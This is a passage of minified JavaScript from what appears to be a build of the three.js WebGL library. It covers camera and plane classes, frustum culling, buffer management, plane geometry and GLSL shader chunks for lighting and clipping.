_get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.fragmentShader=e.fragmentShader,this.vertexShader=e.vertexShader,this.uniforms=Pn(e.uniforms),this.defines=Object.assign({},e.defines),this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.lights=e.lights,this.clipping=e.clipping,this.extensions=Object.assign({},e.extensions),this.glslVersion=e.glslVersion,this}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);for(var r in t.glslVersion=this.glslVersion,t.uniforms={},this.uniforms){var i=this.uniforms[r].value;i&&i.isTexture?t.uniforms[r]={type:"t",value:i.toJSON(e).uuid}:i&&i.isColor?t.uniforms[r]={type:"c",value:i.getHex()}:i&&i.isVector2?t.uniforms[r]={type:"v2",value:i.toArray()}:i&&i.isVector3?t.uniforms[r]={type:"v3",value:i.toArray()}:i&&i.isVector4?t.uniforms[r]={type:"v4",value:i.toArray()}:i&&i.isMatrix3?t.uniforms[r]={type:"m3",value:i.toArray()}:i&&i.isMatrix4?t.uniforms[r]={type:"m4",value:i.toArray()}:t.uniforms[r]={value:i}}0<Object.keys(this.defines).length&&(t.defines=this.defines),t.vertexShader=this.vertexShader,t.fragmentShader=this.fragmentShader;var a={};for(var o in this.extensions)!0===this.extensions[o]&&(a[o]=!0);return 0<Object.keys(a).length&&(t.extensions=a),t}}]),n}();Ln.prototype.isShaderMaterial=!0;var On=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this)).type="Camera",e.matrixWorldInverse=new Xe,e.projectionMatrix=new Xe,e.projectionMatrixInverse=new Xe,e}return _createClass2(n,[{key:"copy",value:function(e,t){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e,t),this.matrixWorldInverse.copy(e.matrixWorldInverse),this.projectionMatrix.copy(e.projectionMatrix),this.projectionMatrixInverse.copy(e.projectionMatrixInverse),this}},{key:"getWorldDirection",value:function(e){this.updateWorldMatrix(!0,!1);var t=this.matrixWorld.elements;return e.set(-t[8],-t[9],-t[10]).normalize()}},{key:"updateMatrixWorld",value:function(e){_get2(_getPrototypeOf(n.prototype),"updateMatrixWorld",this).call(this,e),this.matrixWorldInverse.copy(this.matrixWorld).invert()}},{key:"updateWorldMatrix",value:function(e,t){_get2(_getPrototypeOf(n.prototype),"updateWorldMatrix",this).call(this,e,t),this.matrixWorldInverse.copy(this.matrixWorld).invert()}},{key:"clone",value:function(){return(new this.constructor).copy(this)}}]),n}();On.prototype.isCamera=!0;var Nn=function(e){_inherits2(n,On);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:50,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:.1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:2e3;return _classCallCheck2(this,n),(e=t.call(this)).type="PerspectiveCamera",e.fov=r,e.zoom=1,e.near=a,e.far=o,e.focus=10,e.aspect=i,e.view=null,e.filmGauge=35,e.filmOffset=0,e.updateProjectionMatrix(),e}return _createClass2(n,[{key:"copy",value:function(e,t){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e,t),this.fov=e.fov,this.zoom=e.zoom,this.near=e.near,this.far=e.far,this.focus=e.focus,this.aspect=e.aspect,this.view=null===e.view?null:Object.assign({},e.view),this.filmGauge=e.filmGauge,this.filmOffset=e.filmOffset,this}},{key:"setFocalLength",value:function(e){var t=.5*this.getFilmHeight()/e;this.fov=2*K*Math.atan(t),this.updateProjectionMatrix()}},{key:"getFocalLength",value:function(){var e=Math.tan(.5*W*this.fov);return.5*this.getFilmHeight()/e}},{key:"getEffectiveFOV",value:function(){return 2*K*Math.atan(Math.tan(.5*W*this.fov)/this.zoom)}},{key:"getFilmWidth",value:function(){return this.filmGauge*Math.min(this.aspect,1)}},{key:"getFilmHeight",value:function(){return this.filmGauge/Math.max(this.aspect,1)}},{key:"setViewOffset",value:function(e,t,n,r,i,a){this.aspect=e/t,null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=t,this.view.offsetX=n,this.view.offsetY=r,this.view.width=i,this.view.height=a,this.updateProjectionMatrix()}},{key:"clearViewOffset",value:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()}},{key:"updateProjectionMatrix",value:function(){var e=this.near,t=e*Math.tan(.5*W*this.fov)/this.zoom,n=2*t,r=this.aspect*n,i=-.5*r,a=this.view;if(null!==this.view&&this.view.enabled){var o=a.fullWidth,s=a.fullHeight;i+=a.offsetX*r/o,t-=a.offsetY*n/s,r*=a.width/o,n*=a.height/s}var l=this.filmOffset;0!==l&&(i+=e*l/this.getFilmWidth()),this.projectionMatrix.makePerspective(i,i+r,t,t-n,e,this.far),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);return t.object.fov=this.fov,t.object.zoom=this.zoom,t.object.near=this.near,t.object.far=this.far,t.object.focus=this.focus,t.object.aspect=this.aspect,null!==this.view&&(t.object.view=Object.assign({},this.view)),t.object.filmGauge=this.filmGauge,t.object.filmOffset=this.filmOffset,t}}]),n}();Nn.prototype.isPerspectiveCamera=!0;var Dn=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(e,r,i){var a;if(_classCallCheck2(this,n),(a=t.call(this)).type="CubeCamera",!0!==i.isWebGLCubeRenderTarget)return _possibleConstructorReturn2(a);a.renderTarget=i;var o=new Nn(90,1,e,r);o.layers=a.layers,o.up.set(0,-1,0),o.lookAt(new ye(1,0,0)),a.add(o);var s=new Nn(90,1,e,r);s.layers=a.layers,s.up.set(0,-1,0),s.lookAt(new ye(-1,0,0)),a.add(s);var l=new Nn(90,1,e,r);l.layers=a.layers,l.up.set(0,0,1),l.lookAt(new ye(0,1,0)),a.add(l);var c=new Nn(90,1,e,r);c.layers=a.layers,c.up.set(0,0,-1),c.lookAt(new ye(0,-1,0)),a.add(c);var u=new Nn(90,1,e,r);u.layers=a.layers,u.up.set(0,-1,0),u.lookAt(new ye(0,0,1)),a.add(u);var d=new Nn(90,1,e,r);return d.layers=a.layers,d.up.set(0,-1,0),d.lookAt(new ye(0,0,-1)),a.add(d),a}return _createClass2(n,[{key:"update",value:function(e,t){null===this.parent&&this.updateMatrixWorld();var n=this.renderTarget,r=_slicedToArray(this.children,6),i=r[0],a=r[1],o=r[2],s=r[3],l=r[4],c=r[5],u=e.xr.enabled,d=e.getRenderTarget();e.xr.enabled=!1;var p=n.texture.generateMipmaps;n.texture.generateMipmaps=!1,e.setRenderTarget(n,0),e.render(t,i),e.setRenderTarget(n,1),e.render(t,a),e.setRenderTarget(n,2),e.render(t,o),e.setRenderTarget(n,3),e.render(t,s),e.setRenderTarget(n,4),e.render(t,l),n.texture.generateMipmaps=p,e.setRenderTarget(n,5),e.render(t,c),e.setRenderTarget(d),e.xr.enabled=u}}]),n}(),Rn=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(e,i,a,o,s,l,c,u,d,p){var h;return _classCallCheck2(this,n),e=void 0!==e?e:[],i=void 0!==i?i:r,(h=t.call(this,e,i,a,o,s,l,c,u,d,p)).flipY=!1,h}return _createClass2(n,[{key:"images",get:function(){return this.image},set:function(e){this.image=e}}]),n}();Rn.prototype.isCubeTexture=!0;var jn=function(e){_inherits2(n,Ae);var t=_createSuper(n);function n(e,r,i){var a;return _classCallCheck2(this,n),Number.isInteger(r)&&(r=i),a=t.call(this,e,e,r),r=r||{},a.texture=new Rn(void 0,r.mapping,r.wrapS,r.wrapT,r.magFilter,r.minFilter,r.format,r.type,r.anisotropy,r.encoding),a.texture.isRenderTargetTexture=!0,a.texture.generateMipmaps=void 0!==r.generateMipmaps&&r.generateMipmaps,a.texture.minFilter=void 0!==r.minFilter?r.minFilter:A,a.texture._needsFlipEnvMap=!1,a}return _createClass2(n,[{key:"fromEquirectangularTexture",value:function(e,t){this.texture.type=t.type,this.texture.format=S,this.texture.encoding=t.encoding,this.texture.generateMipmaps=t.generateMipmaps,this.texture.minFilter=t.minFilter,this.texture.magFilter=t.magFilter;var n=new Tn(5,5,5),r=new Ln({name:"CubemapFromEquirect",uniforms:Pn({tEquirect:{value:null}}),vertexShader:"\n\n\t\t\t\tvarying vec3 vWorldDirection;\n\n\t\t\t\tvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\n\t\t\t\t\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n\n\t\t\t\t}\n\n\t\t\t\tvoid main() {\n\n\t\t\t\t\tvWorldDirection = transformDirection( position, modelMatrix );\n\n\t\t\t\t\t#include <begin_vertex>\n\t\t\t\t\t#include <project_vertex>\n\n\t\t\t\t}\n\t\t\t",fragmentShader:"\n\n\t\t\t\tuniform sampler2D tEquirect;\n\n\t\t\t\tvarying vec3 vWorldDirection;\n\n\t\t\t\t#include <common>\n\n\t\t\t\tvoid main() {\n\n\t\t\t\t\tvec3 direction = normalize( vWorldDirection );\n\n\t\t\t\t\tvec2 sampleUV = equirectUv( direction );\n\n\t\t\t\t\tgl_FragColor = texture2D( tEquirect, sampleUV );\n\n\t\t\t\t}\n\t\t\t",side:1,blending:0});r.uniforms.tEquirect.value=t;var i=new Bn(n,r),a=t.minFilter;return t.minFilter===v&&(t.minFilter=A),new Dn(1,10,this).update(e,i),t.minFilter=a,i.geometry.dispose(),i.material.dispose(),this}},{key:"clear",value:function(e,t,n,r){for(var i=e.getRenderTarget(),a=0;a<6;a++)e.setRenderTarget(this,a),e.clear(t,n,r);e.setRenderTarget(i)}}]),n}();jn.prototype.isWebGLCubeRenderTarget=!0;var Un=new ye,$n=new ye,zn=new ie,Hn=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye(1,0,0),n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;_classCallCheck2(this,e),this.normal=t,this.constant=n}return _createClass2(e,[{key:"set",value:function(e,t){return this.normal.copy(e),this.constant=t,this}},{key:"setComponents",value:function(e,t,n,r){return this.normal.set(e,t,n),this.constant=r,this}},{key:"setFromNormalAndCoplanarPoint",value:function(e,t){return this.normal.copy(e),this.constant=-t.dot(this.normal),this}},{key:"setFromCoplanarPoints",value:function(e,t,n){var r=Un.subVectors(n,t).cross($n.subVectors(e,t)).normalize();return this.setFromNormalAndCoplanarPoint(r,e),this}},{key:"copy",value:function(e){return this.normal.copy(e.normal),this.constant=e.constant,this}},{key:"normalize",value:function(){var e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this}},{key:"negate",value:function(){return this.constant*=-1,this.normal.negate(),this}},{key:"distanceToPoint",value:function(e){return this.normal.dot(e)+this.constant}},{key:"distanceToSphere",value:function(e){return this.distanceToPoint(e.center)-e.radius}},{key:"projectPoint",value:function(e,t){return t.copy(this.normal).multiplyScalar(-this.distanceToPoint(e)).add(e)}},{key:"intersectLine",value:function(e,t){var n=e.delta(Un),r=this.normal.dot(n);if(0===r)return 0===this.distanceToPoint(e.start)?t.copy(e.start):null;var i=-(e.start.dot(this.normal)+this.constant)/r;return i<0||1<i?null:t.copy(n).multiplyScalar(i).add(e.start)}},{key:"intersectsLine",value:function(e){var t=this.distanceToPoint(e.start),n=this.distanceToPoint(e.end);return t<0&&0<n||n<0&&0<t}},{key:"intersectsBox",value:function(e){return e.intersectsPlane(this)}},{key:"intersectsSphere",value:function(e){return e.intersectsPlane(this)}},{key:"coplanarPoint",value:function(e){return e.copy(this.normal).multiplyScalar(-this.constant)}},{key:"applyMatrix4",value:function(e,t){var n=t||zn.getNormalMatrix(e),r=this.coplanarPoint(Un).applyMatrix4(e),i=this.normal.applyMatrix3(n).normalize();return this.constant=-r.dot(i),this}},{key:"translate",value:function(e){return this.constant-=e.dot(this.normal),this}},{key:"equals",value:function(e){return e.normal.equals(this.normal)&&e.constant===this.constant}},{key:"clone",value:function(){return(new this.constructor).copy(this)}}]),e}();Hn.prototype.isPlane=!0;var Vn=new $e,Qn=new ye,Gn=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new Hn,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new Hn,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:new Hn,i=3<arguments.length&&void 0!==arguments[3]?arguments[3]:new Hn,a=4<arguments.length&&void 0!==arguments[4]?arguments[4]:new Hn,o=5<arguments.length&&void 0!==arguments[5]?arguments[5]:new Hn;_classCallCheck2(this,e),this.planes=[t,n,r,i,a,o]}return _createClass2(e,[{key:"set",value:function(e,t,n,r,i,a){var o=this.planes;return o[0].copy(e),o[1].copy(t),o[2].copy(n),o[3].copy(r),o[4].copy(i),o[5].copy(a),this}},{key:"copy",value:function(e){for(var t=this.planes,n=0;n<6;n++)t[n].copy(e.planes[n]);return this}},{key:"setFromProjectionMatrix",value:function(e){var t=this.planes,n=e.elements,r=n[0],i=n[1],a=n[2],o=n[3],s=n[4],l=n[5],c=n[6],u=n[7],d=n[8],p=n[9],h=n[10],f=n[11],A=n[12],m=n[13],v=n[14],g=n[15];return t[0].setComponents(o-r,u-s,f-d,g-A).normalize(),t[1].setComponents(o+r,u+s,f+d,g+A).normalize(),t[2].setComponents(o+i,u+l,f+p,g+m).normalize(),t[3].setComponents(o-i,u-l,f-p,g-m).normalize(),t[4].setComponents(o-a,u-c,f-h,g-v).normalize(),t[5].setComponents(o+a,u+c,f+h,g+v).normalize(),this}},{key:"intersectsObject",value:function(e){var t=e.geometry;return null===t.boundingSphere&&t.computeBoundingSphere(),Vn.copy(t.boundingSphere).applyMatrix4(e.matrixWorld),this.intersectsSphere(Vn)}},{key:"intersectsSprite",value:function(e){return Vn.center.set(0,0,0),Vn.radius=.7071067811865476,Vn.applyMatrix4(e.matrixWorld),this.intersectsSphere(Vn)}},{key:"intersectsSphere",value:function(e){for(var t=this.planes,n=e.center,r=-e.radius,i=0;i<6;i++)if(t[i].distanceToPoint(n)<r)return!1;return!0}},{key:"intersectsBox",value:function(e){for(var t=this.planes,n=0;n<6;n++){var r=t[n];if(Qn.x=0<r.normal.x?e.max.x:e.min.x,Qn.y=0<r.normal.y?e.max.y:e.min.y,Qn.z=0<r.normal.z?e.max.z:e.min.z,r.distanceToPoint(Qn)<0)return!1}return!0}},{key:"containsPoint",value:function(e){for(var t=this.planes,n=0;n<6;n++)if(t[n].distanceToPoint(e)<0)return!1;return!0}},{key:"clone",value:function(){return(new this.constructor).copy(this)}}]),e}();function Wn(){var e=null,t=!1,n=null,r=null;function i(t,a){n(t,a),r=e.requestAnimationFrame(i)}return{start:function(){!0!==t&&null!==n&&(r=e.requestAnimationFrame(i),t=!0)},stop:function(){e.cancelAnimationFrame(r),t=!1},setAnimationLoop:function(e){n=e},setContext:function(t){e=t}}}function Kn(e,t){var n=t.isWebGL2,r=new WeakMap;return{get:function(e){return e.isInterleavedBufferAttribute&&(e=e.data),r.get(e)},remove:function(t){t.isInterleavedBufferAttribute&&(t=t.data);var n=r.get(t);n&&(e.deleteBuffer(n.buffer),r.delete(t))},update:function(t,i){if(t.isGLBufferAttribute){var a=r.get(t);(!a||a.version<t.version)&&r.set(t,{buffer:t.buffer,type:t.type,bytesPerElement:t.elementSize,version:t.version})}else{t.isInterleavedBufferAttribute&&(t=t.data);var o,s,l,c,u,d=r.get(t);void 0===d?r.set(t,function(t,r){var i=t.array,a=t.usage,o=e.createBuffer();e.bindBuffer(r,o),e.bufferData(r,i,a),t.onUploadCallback();var s=e.FLOAT;return i instanceof Float32Array?s=e.FLOAT:i instanceof Float64Array||(i instanceof Uint16Array?t.isFloat16BufferAttribute?n&&(s=e.HALF_FLOAT):s=e.UNSIGNED_SHORT:i instanceof Int16Array?s=e.SHORT:i instanceof Uint32Array?s=e.UNSIGNED_INT:i instanceof Int32Array?s=e.INT:i instanceof Int8Array?s=e.BYTE:(i instanceof Uint8Array||i instanceof Uint8ClampedArray)&&(s=e.UNSIGNED_BYTE)),{buffer:o,type:s,bytesPerElement:i.BYTES_PER_ELEMENT,version:t.version}}(t,i)):d.version<t.version&&(o=d.buffer,l=i,c=(s=t).array,u=s.updateRange,e.bindBuffer(l,o),-1===u.count?e.bufferSubData(l,0,c):(n?e.bufferSubData(l,u.offset*c.BYTES_PER_ELEMENT,c,u.offset,u.count):e.bufferSubData(l,u.offset*c.BYTES_PER_ELEMENT,c.subarray(u.offset,u.offset+u.count)),u.count=-1),d.version=t.version)}}}}var qn=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1;_classCallCheck2(this,n),(e=t.call(this)).type="PlaneGeometry",e.parameters={width:r,height:i,widthSegments:a,heightSegments:o};for(var s=r/2,l=i/2,c=Math.floor(a),u=Math.floor(o),d=c+1,p=u+1,h=r/c,f=i/u,A=[],m=[],v=[],g=[],y=0;y<p;y++)for(var b=y*f-l,_=0;_<d;_++){var w=_*h-s;m.push(w,-b,0),v.push(0,0,1),g.push(_/c),g.push(1-y/u)}for(var C=0;C<u;C++)for(var x=0;x<c;x++){var S=x+d*C,k=x+d*(C+1),M=x+1+d*(C+1),B=x+1+d*C;A.push(S,k,B),A.push(k,M,B)}return e.setIndex(A),e.setAttribute("position",new en(m,3)),e.setAttribute("normal",new en(v,3)),e.setAttribute("uv",new en(g,2)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.width,e.height,e.widthSegments,e.heightSegments)}}]),n}(),Xn={alphamap_fragment:"#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\n#endif",alphamap_pars_fragment:"#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif",alphatest_fragment:"#ifdef USE_ALPHATEST\n\tif ( diffuseColor.a < alphaTest ) discard;\n#endif",alphatest_pars_fragment:"#ifdef USE_ALPHATEST\n\tuniform float alphaTest;\n#endif",aomap_fragment:"#ifdef USE_AOMAP\n\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\n\treflectedLight.indirectDiffuse *= ambientOcclusion;\n\t#if defined( USE_ENVMAP ) && defined( STANDARD )\n\t\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.roughness );\n\t#endif\n#endif",aomap_pars_fragment:"#ifdef USE_AOMAP\n\tuniform sampler2D aoMap;\n\tuniform float aoMapIntensity;\n#endif",begin_vertex:"vec3 transformed = vec3( position );",beginnormal_vertex:"vec3 objectNormal = vec3( normal );\n#ifdef USE_TANGENT\n\tvec3 objectTangent = vec3( tangent.xyz );\n#endif",bsdfs:"vec3 BRDF_Lambert( const in vec3 diffuseColor ) {\n\treturn RECIPROCAL_PI * diffuseColor;\n}\nvec3 F_Schlick( const in vec3 f0, const in float f90, const in float dotVH ) {\n\tfloat fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );\n\treturn f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );\n}\nfloat V_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\treturn 0.5 / max( gv + gl, EPSILON );\n}\nfloat D_GGX( const in float alpha, const in float dotNH ) {\n\tfloat a2 = pow2( alpha );\n\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\n\treturn RECIPROCAL_PI * a2 / pow2( denom );\n}\nvec3 BRDF_GGX( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in vec3 f0, const in float f90, const in float roughness ) {\n\tfloat alpha = pow2( roughness );\n\tvec3 halfDir = normalize( lightDir + viewDir );\n\tfloat dotNL = saturate( dot( normal, lightDir ) );\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tfloat dotNH = saturate( dot( normal, halfDir ) );\n\tfloat dotVH = saturate( dot( viewDir, halfDir ) );\n\tvec3 F = F_Schlick( f0, f90, dotVH );\n\tfloat V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );\n\tfloat D = D_GGX( alpha, dotNH );\n\treturn F * ( V * D );\n}\nvec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {\n\tconst float LUT_SIZE = 64.0;\n\tconst float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;\n\tconst float LUT_BIAS = 0.5 / LUT_SIZE;\n\tfloat dotNV = saturate( dot( N, V ) );\n\tvec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );\n\tuv = uv * LUT_SCALE + LUT_BIAS;\n\treturn uv;\n}\nfloat LTC_ClippedSphereFormFactor( const in vec3 f ) {\n\tfloat l = length( f );\n\treturn max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );\n}\nvec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {\n\tfloat x = dot( v1, v2 );\n\tfloat y = abs( x );\n\tfloat a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;\n\tfloat b = 3.4175940 + ( 4.1616724 + y ) * y;\n\tfloat v = a / b;\n\tfloat theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;\n\treturn cross( v1, v2 ) * theta_sintheta;\n}\nvec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {\n\tvec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];\n\tvec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];\n\tvec3 lightNormal = cross( v1, v2 );\n\tif( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );\n\tvec3 T1, T2;\n\tT1 = normalize( V - N * dot( V, N ) );\n\tT2 = - cross( N, T1 );\n\tmat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );\n\tvec3 coords[ 4 ];\n\tcoords[ 0 ] = mat * ( rectCoords[ 0 ] - P );\n\tcoords[ 1 ] = mat * ( rectCoords[ 1 ] - P );\n\tcoords[ 2 ] = mat * ( rectCoords[ 2 ] - P );\n\tcoords[ 3 ] = mat * ( rectCoords[ 3 ] - P );\n\tcoords[ 0 ] = normalize( coords[ 0 ] );\n\tcoords[ 1 ] = normalize( coords[ 1 ] );\n\tcoords[ 2 ] = normalize( coords[ 2 ] );\n\tcoords[ 3 ] = normalize( coords[ 3 ] );\n\tvec3 vectorFormFactor = vec3( 0.0 );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );\n\tfloat result = LTC_ClippedSphereFormFactor( vectorFormFactor );\n\treturn vec3( result );\n}\nfloat G_BlinnPhong_Implicit( ) {\n\treturn 0.25;\n}\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\n\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\n}\nvec3 BRDF_BlinnPhong( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float shininess ) {\n\tvec3 halfDir = normalize( lightDir + viewDir );\n\tfloat dotNH = saturate( dot( normal, halfDir ) );\n\tfloat dotVH = saturate( dot( viewDir, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, 1.0, dotVH );\n\tfloat G = G_BlinnPhong_Implicit( );\n\tfloat D = D_BlinnPhong( shininess, dotNH );\n\treturn F * ( G * D );\n}\n#if defined( USE_SHEEN )\nfloat D_Charlie( float roughness, float dotNH ) {\n\tfloat alpha = pow2( roughness );\n\tfloat invAlpha = 1.0 / alpha;\n\tfloat cos2h = dotNH * dotNH;\n\tfloat sin2h = max( 1.0 - cos2h, 0.0078125 );\n\treturn ( 2.0 + invAlpha ) * pow( sin2h, invAlpha * 0.5 ) / ( 2.0 * PI );\n}\nfloat V_Neubelt( float dotNV, float dotNL ) {\n\treturn saturate( 1.0 / ( 4.0 * ( dotNL + dotNV - dotNL * dotNV ) ) );\n}\nvec3 BRDF_Sheen( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, vec3 sheenColor, const in float sheenRoughness ) {\n\tvec3 halfDir = normalize( lightDir + viewDir );\n\tfloat dotNL = saturate( dot( normal, lightDir ) );\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tfloat dotNH = saturate( dot( normal, halfDir ) );\n\tfloat D = D_Charlie( sheenRoughness, dotNH );\n\tfloat V = V_Neubelt( dotNV, dotNL );\n\treturn sheenColor * ( D * V );\n}\n#endif",bumpmap_pars_fragment:"#ifdef USE_BUMPMAP\n\tuniform sampler2D bumpMap;\n\tuniform float bumpScale;\n\tvec2 dHdxy_fwd() {\n\t\tvec2 dSTdx = dFdx( vUv );\n\t\tvec2 dSTdy = dFdy( vUv );\n\t\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\n\t\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\n\t\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\n\t\treturn vec2( dBx, dBy );\n\t}\n\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy, float faceDirection ) {\n\t\tvec3 vSigmaX = vec3( dFdx( surf_pos.x ), dFdx( surf_pos.y ), dFdx( surf_pos.z ) );\n\t\tvec3 vSigmaY = vec3( dFdy( surf_pos.x ), dFdy( surf_pos.y ), dFdy( surf_pos.z ) );\n\t\tvec3 vN = surf_norm;\n\t\tvec3 R1 = cross( vSigmaY, vN );\n\t\tvec3 R2 = cross( vN, vSigmaX );\n\t\tfloat fDet = dot( vSigmaX, R1 ) * faceDirection;\n\t\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\n\t\treturn normalize( abs( fDet ) * surf_norm - vGrad );\n\t}\n#endif",clipping_planes_fragment:"#if NUM_CLIPPING_PLANES > 0\n\tvec4 plane;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {\n\t\tplane = clippingPlanes[ i ];\n\t\tif ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;\n\t}\n\t#pragma unroll_loop_end\n\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\n\t\tbool clipped = true;\n\t\t#pragma unroll_loop_start\n\t\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {\n\t\t\tplane = clippingPlanes[ i ];\n\t\t\tclipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;\n\t\t}\n\t\t#pragma unroll_loop_end\n\t\tif ( clipped ) discard;\n\t#endif\n#endif",clipping_planes_pars_fragment:"#if NUM_CLIPPING_PLANES > 0\n\tvarying vec3 vClipPosition;\n\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\n#endif",clipping_planes_pars_vertex:"#if NUM_CLIPPING_PLANES > 0\n\tvarying vec3 vClipPosition;\n#endif",clipping_planes_vertex:"#if NUM_CLIPPING_PLANES > 0\n\tvClipPosition = - mvPosition.xyz;\n#endif",color_fragment:"#if defined( USE_COLOR_ALPHA )\n\tdiffuseColor *= vColor;\n#elif defined( USE_COLOR )\n\tdiffuseColor.rgb *= vColor;\n#endif",color_pars_fragment:"#if defined( USE_COLOR_ALPHA )\n\tvarying vec4 vColor;\n#elif defined( USE_COLOR )\n\tvarying vec3 vColor;\n#endif",color_pars_vertex:"#if defined( USE_COLOR_ALPHA )\n\tvarying vec4 vColor;\n#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )\n\tvarying vec3 vColor;\n#endif",color_vertex:"#if defined( USE_COLOR_ALPHA )\n\tvColor = vec4( 1.0 );\n#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )\n\tvColor = vec3( 1.0 );\n#endif\n#ifdef USE_COLOR\n\tvColor *= color;\n#endif\n#ifdef USE_INSTANCING_COLOR\n\tvColor.xyz *= instanceColor.xyz;\n#endif",common:"#define PI 3.141592653589793\n#define PI2 6.283185307179586\n#define PI_HALF 1.5707963267948966\n#define RECIPROCAL_PI 0.3183098861837907\n#define RECIPROCAL_PI2 0.15915494309189535\n#define EPSILON 1e-6\n#ifndef saturate\n#define saturate( a ) clamp( a, 0.0, 1.0 )\n#endif\n#define whiteComplement( a ) ( 1.0 - saturate( a ) )\nfloat pow2( const in float x ) { return x*x; }\nfloat pow3( const in float x ) { return x*x*x; }\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\nfloat max3( const in vec3 v ) { return max( max( v.x, v.y ), v.z ); }\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\nhighp float rand( const in vec2 uv ) {\n\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\n\thighp float dt = dot( 